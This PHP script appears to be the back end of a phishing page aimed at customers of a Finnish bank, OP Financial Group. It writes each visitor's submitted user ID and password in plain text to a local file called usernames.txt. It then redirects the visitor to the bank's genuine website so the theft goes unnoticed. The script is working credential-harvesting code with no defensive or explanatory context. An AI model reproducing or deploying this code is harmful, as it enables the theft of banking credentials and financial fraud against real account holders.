<?php

file_put_contents("usernames.txt", "Username: " . $_POST['userId'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "https://www.op.fi/op-financial-group"; 
header("Location: $url");
exit();
?>
